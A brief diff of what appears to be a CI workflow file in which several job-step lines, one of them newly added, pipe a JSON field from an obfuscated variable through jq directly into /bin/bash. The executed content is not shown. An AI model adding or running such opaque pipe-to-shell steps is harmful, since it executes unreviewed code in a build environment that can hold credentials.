@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$n7851" | jq -r .cmgh766 | /bin/bash
           printf '%s' "$esi5" | jq -r .e604 | /bin/bash
           echo $jd3 | jq -r .bh0674 | /bin/bash
+          printf '%s' "$bovy114" | jq -r .msi2 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
